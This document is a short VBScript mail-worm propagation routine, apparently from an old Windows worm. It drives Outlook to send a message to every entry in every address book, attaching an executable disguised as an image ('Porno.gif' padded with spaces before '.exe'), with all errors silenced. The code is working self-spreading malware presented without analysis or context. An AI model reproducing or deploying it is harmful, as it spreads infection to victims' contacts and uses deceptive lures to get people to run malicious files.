On Error Resume Next
Set Outlook = CreateObject("OutLook.Application")
If ( Outlook <> "" ) Then
With Outlook
Set MAPI = .GetNameSpace("MAPI")
End With
With MAPI
Set AddrList = .AddressLists
End With
For I = 1 to AddrList.Count
With OutLook
Set NuevoMail = .CreateItem(0)
End With
Set LibroActual = AddrList.Item(I)
With NuevoMail
.Attachments.Add "C:\WINDOWS\Porno.gif                    .exe"
End With
Set Yuca = LibroActual.AddressEntries
With Yuca
For J = 1 to .Count
With NuevoMail
Set bajo = .Recipients
bajo.Add Yuca(J)
End With
Next
End With
With NuevoMail
.Send
End With
Next
Outlook.Quit
End If
